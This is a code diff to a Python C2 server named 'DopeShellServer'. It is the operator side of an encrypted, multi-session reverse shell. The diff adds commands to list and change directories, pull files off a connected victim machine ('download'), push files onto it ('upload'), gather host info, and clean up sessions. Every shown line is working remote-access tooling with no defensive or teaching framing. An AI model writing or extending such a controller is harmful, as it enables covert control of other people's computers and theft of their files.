@@ -4,6 +4,7 @@ import socket
 import threading
 import base64
 import os
+import platform
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -40,9 +41,52 @@ class DopeShellServer:
             if session_id != self.active_session:
                 continue
             command = input(f"Session {session_id} Shell> ")
+            
             if command.lower() == 'exit':
                 client_socket.send(self.encrypt(command.encode('utf-8')))
                 break
+
+            elif command.lower().startswith('ls'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('pwd'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('cd'):
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower().startswith('download'):
+                _, remote_path = command.split()
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                with open(os.path.basename(remote_path), 'wb') as f:
+                    while True:
+                        file_data = self.decrypt(client_socket.recv(4096))
+                        if file_data == b'EOF':
+                            break
+                        f.write(file_data)
+                print(f"[+] Downloaded {remote_path} from the client.")
+
+            elif command.lower().startswith('upload'):
+                _, local_path = command.split()
+                client_socket.send(self.encrypt(f"upload {os.path.basename(local_path)}".encode('utf-8')))
+                with open(local_path, 'rb') as f:
+                    while chunk := f.read(4096):
+                        client_socket.send(self.encrypt(chunk))
+                client_socket.send(self.encrypt(b'EOF'))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
+            elif command.lower() == 'info':
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
             elif command.lower().startswith("switch"):
                 _, new_session_id = command.split()
                 if int(new_session_id) in self.sessions:
@@ -51,10 +95,16 @@ class DopeShellServer:
                 else:
                     print(f"[-] Session {new_session_id} does not exist.")
                 continue
-            client_socket.send(self.encrypt(command.encode('utf-8')))
-            response = client_socket.recv(4096)
-            print(self.decrypt(response).decode('utf-8'))
+            else:
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = client_socket.recv(4096)
+                print(self.decrypt(response).decode('utf-8'))
+
         client_socket.close()
+        del self.sessions[session_id]  # Remove session on exit
+        if not self.sessions:
+            self.active_session = None  # Reset active session if no sessions remain
+
 
     def run(self):
         print(f"[*] Listening on {self.host}:{self.port}")
